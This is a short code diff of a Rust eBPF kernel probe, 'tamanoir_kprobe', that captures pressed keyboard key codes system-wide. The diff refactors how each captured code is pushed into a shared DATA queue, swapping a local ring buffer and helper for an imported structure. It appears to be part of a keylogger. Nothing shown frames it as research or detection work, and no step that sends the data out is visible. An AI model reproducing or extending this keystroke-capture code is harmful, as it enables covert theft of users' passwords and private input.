@@ -1,23 +1,14 @@
 use aya_ebpf::{
     macros::{kprobe, map},
-    maps::{Array, RingBuf},
+    maps::Array,
     programs::ProbeContext,
 };
+
+use crate::common::DATA;
 const KEY_EVENT: u32 = 1;
 
 #[map]
 static LAST_KEY: Array<u32> = Array::with_max_entries(1, 0);
-
-#[map]
-static DATA: RingBuf = RingBuf::with_byte_size(4096, 0);
-
-#[inline]
-fn submit(key: u32) {
-    if let Some(mut buf) = DATA.reserve::<u32>(0) {
-        unsafe { (*buf.as_mut_ptr()) = key };
-        buf.submit(0);
-    }
-}
 
 #[kprobe]
 pub fn tamanoir_kprobe(ctx: ProbeContext) -> u32 {
@@ -38,8 +29,7 @@ fn kprobe_process(ctx: ProbeContext) -> Result<u32, u32> {
                 unsafe { *key = 0 };
             } else {
                 unsafe { *key = code };
-                // info!(&ctx, "Key {} Pressed", code);
-                submit(code);
+                let _ = DATA.push(&code, 0);
             }
         }
     }
